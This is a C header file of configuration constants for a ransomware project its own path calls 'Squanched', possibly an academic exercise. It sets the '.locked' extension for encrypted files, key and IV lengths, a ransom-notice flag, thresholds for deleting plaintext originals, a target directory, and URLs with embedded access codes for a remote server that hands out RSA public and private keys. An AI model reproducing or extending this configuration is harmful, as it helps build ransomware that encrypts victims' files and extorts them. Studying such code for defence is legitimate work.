#pragma once
/*
* Extension for all locked files
*/
#define LOCKED_EXTENSION ".locked"

/*
* Key length in bytes, default is 32 (256 bits)
*/
#define KEY_LEN (256/8) // 256 bits

/*
* If notification file should be created
*/
#define OPEN_FILE true


#define CPU_CYCLES_PERCENT 100

#define IV_LEN (128/8)

/*
 * Num of digits to represent IV size in bytes
 */
#define IV_DIGITS_NUM 2

#define ID_LEN (256/8) // 256 bits

#define ENCRYPTED_KEY_IV_LEN (1024/8)

#define URL_PUBLIC_RSA R"(https://squanchedhttpexample.azurewebsites.net/api/GetPublicKey?code=/JhagZr0xhT/CfqmBa/B0csng8kQKhPCXo7xjnfWJOD6P0sgITy4GQ==&&ID=)"
#define URL_PRIVATE_RSA R"(https://squanchedhttpexample.azurewebsites.net/api/GetPrivateKey?code=cqM2PfQd1BAnI1LH4ti5K7L1Up1uzokZ7vYe2Zasb81LXi3dr07PSg==&&ID=)"
#define FINISHED_ENCRYPTION '1'
#define NOT_FINISHED_ENCRYPTION '0'

#define VM 1

/*
 * Size sum before removing the plaintext 
 * files that are currently decrypted
 */
#define SIZE_THRESHOLD (107374182L*2)
#define COUNT_THRESHOLD 100
#define MAX_FILE_SIZE 107374182L  // 100MB

//#ifdef DEBUG
#define ROOT_DIR R"(C:\Programming\RansomWare\236499\Squanched\Debug\testDir)"
//#endif
